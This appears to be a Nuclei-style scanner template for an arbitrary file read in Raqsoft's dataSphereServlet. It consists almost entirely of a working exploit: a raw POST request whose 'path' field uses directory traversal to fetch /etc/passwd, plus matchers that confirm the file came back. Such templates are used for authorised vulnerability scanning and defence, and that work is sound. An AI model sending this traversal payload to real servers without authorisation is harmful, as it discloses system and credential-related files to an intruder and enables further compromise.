id: poc-yaml-raqsoft-path-anyfile-read
info:
  name: Raqsoft Path Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - raw:
      - |
        POST /servlet/dataSphereServlet?action=11 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        path=../../../../../../../../../../../etc/passwd&content=&mode=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root"
          - "/bin"
      - type: word
        part: header
        words:
          - "filename=passwd"
      - type: word
        part: header
        words:
          - "application/x-msdownload"
